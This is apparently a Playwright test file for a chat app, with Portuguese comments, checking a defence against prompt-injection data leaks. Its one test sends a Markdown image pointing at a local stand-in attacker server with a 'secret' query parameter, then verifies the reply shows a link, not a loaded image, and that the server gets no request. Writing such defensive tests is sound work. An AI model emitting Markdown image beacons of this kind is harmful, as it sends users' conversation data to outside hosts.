import { expect, test } from '@playwright/test';
import { loginAs } from '../support/auth';
import { ChatPage } from '../support/chat-page';
import { servePage } from '../support/local-page';

/**
 * Defesas que valem mesmo quando o modelo obedece a uma instrução escondida:
 * fecham os caminhos por onde os dados da conversa sairiam.
 */
test.describe('Prompt injection', () => {
  let chat: ChatPage;

  test.beforeEach(async ({ page }) => {
    await loginAs(page);
    await page.goto('/');
    chat = new ChatPage(page);
    await chat.startNewConversation();
  });

  test('a imagem em Markdown da resposta vira link e não é carregada', async () => {
    const attacker = await servePage('pixel');
    const imageUrl = `${attacker.url}?d=segredo`;

    // O LLM falso repete a mensagem: a resposta traz a imagem em Markdown.
    await chat.send(`![foto](${imageUrl})`);

    const reply = chat.assistantReplies().last();
    await expect(reply.getByRole('link', { name: 'foto' })).toHaveAttribute('href', imageUrl);
    await expect(reply.getByRole('img')).toHaveCount(0);
    expect(attacker.requests).toEqual([]);
    attacker.server.close();
  });
});
